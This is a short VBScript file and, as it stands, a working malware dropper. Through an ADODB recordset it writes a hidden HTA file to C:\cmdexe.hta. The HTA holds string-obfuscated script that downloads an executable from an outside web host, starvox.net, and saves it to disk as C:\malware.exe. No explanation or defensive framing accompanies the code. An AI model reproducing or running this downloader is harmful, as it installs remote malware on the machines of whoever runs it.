on error resume next
set conn = CreateObject("ADODB.Recordset")
   With conn
       .Fields.Append "conn", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("conn").Value = "<body style=""display:none"" scroll=""no"">"
       Call .AddNew
       .Fields("conn").Value = "<script language=""vbscript"">: on error resume next : a=""m""+""sxm""+""l2.XM""+""LH""+""T""+""TP"" : b=""ad""+""o""+""d""+""b.""+""stre""+""am"" : c=""C:\m""+""al""+""war""+""e""+"".e""+""xe"" : set o = CreateObject(a) : o.open ""GET"",""http://starvox.net/crypt/42/cmdexe.exe"",False : o.send : set s = createobject(b) : s.type=1 : s.open : s.write o.responseBody : s.savetofile c,2 : window.close()</script>"
       Call .Update
   End With
conn.Save "C:\cmdexe.hta", adPersistXML
conn.Close
